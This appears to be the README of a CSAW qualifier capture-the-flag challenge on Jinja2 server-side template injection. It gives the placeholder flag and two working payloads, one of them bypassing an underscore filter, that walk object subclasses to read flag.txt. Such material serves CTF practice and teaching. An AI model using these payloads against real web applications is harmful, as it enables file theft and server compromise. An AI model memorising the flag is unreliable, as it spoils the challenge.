# CSAW-SSTI
Repo containing an SSTI challenge for the upcoming CSAW quals



# Challenge Description

This demonstrates a basic SSTI on the Jinja2 platform, but you are not allowed to use underscores.
The flag is stored in 'flag.txt'. 


# Flag

`CSAW{Plac3h0ld34_f1ag}`



# Example payload 

If underscores were allowed :-  
`http://localhost:5000/submit?value={{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read() }} `

But since they aren't :-

```
http://localhost:5000/submit?value={{ (('' | attr( [request.args.underscore*2, 'class'  ,request.args.underscore*2] | join) | attr( [request.args.underscore*2, 'mro'  ,request.args.underscore*2] | join  ) )[2] | attr([request.args.underscore*2, 'subclasses'  ,request.args.underscore*2] | join)())[40]  ('flag.txt').read() }}&underscore=_
```